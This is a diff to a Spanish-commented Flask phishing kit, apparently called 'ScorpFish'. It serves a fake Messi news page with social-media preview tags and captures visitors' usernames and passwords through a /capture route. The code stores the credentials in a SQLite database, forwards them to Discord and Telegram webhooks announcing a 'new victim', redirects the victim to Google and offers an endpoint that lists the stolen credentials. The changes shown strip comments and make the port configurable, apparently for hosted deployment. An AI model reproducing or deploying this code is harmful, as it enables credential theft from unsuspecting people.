@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
+import os  # <--- IMPORTANTE
 from flask import Flask, request, render_template_string, redirect, jsonify
 import sqlite3
 import json
 import requests
 from datetime import datetime
-import os
 
 app = Flask(__name__)
 
@@ -56,8 +56,6 @@ def get_template():
     <meta name="twitter:title" content="😲 Fuertes declaraciones de Messi" />
     <meta name="twitter:description" content="Me dijeron que ganaría" />
     <meta name="twitter:image" content="https://i.imgur.com/kgo0gfA.png" />
-    
-    <!-- METADATOS PARA WHATSAPP (usa los mismos de og:) -->
     
     <title>😲 Fuertes declaraciones de Messi</title>
     <style>
@@ -182,10 +180,8 @@ def send_webhook(data):
     except:
         return
     
-    # Discord
     if config.get('discord_webhook'):
         try:
-            import requests
             message = {
                 "content": f"🎯 **Nueva víctima!**\\n📍 IP: {data['ip']}\\n👤 Usuario: {data['username']}\\n🔑 Pass: {data['password'][:10]}...",
                 "username": "ScorpFish Bot"
@@ -194,7 +190,6 @@ def send_webhook(data):
         except:
             pass
     
-    # Telegram
     if config.get('telegram_token') and config.get('telegram_chat'):
         try:
             url = f"https://api.telegram.org/bot{config['telegram_token']}/sendMessage"
@@ -205,7 +200,6 @@ def send_webhook(data):
 
 @app.route('/')
 def index():
-    # MODO PRUEBA: SIN BLOQUEOS PARA QUE FUNCIONE EN TODAS PARTES
     return render_template_string(get_template())
 
 @app.route('/capture', methods=['POST'])
@@ -228,7 +222,6 @@ def capture():
         'geo_location': location
     }
     
-    # Guardar en DB
     conn = sqlite3.connect('credentials.db')
     cursor = conn.cursor()
     cursor.execute('''
@@ -239,10 +232,8 @@ def capture():
     conn.commit()
     conn.close()
     
-    # Enviar webhook
     send_webhook(data)
     
-    # Redirigir
     return redirect("https://www.google.com")
 
 @app.route('/api/credentials')
@@ -256,6 +247,7 @@ def api_credentials():
 
 if __name__ == '__main__':
     init_db()
-    print("[+] Servidor iniciado en http://localhost:8080")
+    port = int(os.environ.get('PORT', 8080))  # <--- CAMBIADO
+    print("[+] Servidor iniciado en http://localhost:" + str(port))
     print("[+] Presiona Ctrl+C para detener")
-    app.run(host='0.0.0.0', port=8080, debug=False)
+    app.run(host='0.0.0.0', port=port, debug=False)  # <--- CAMBIADO
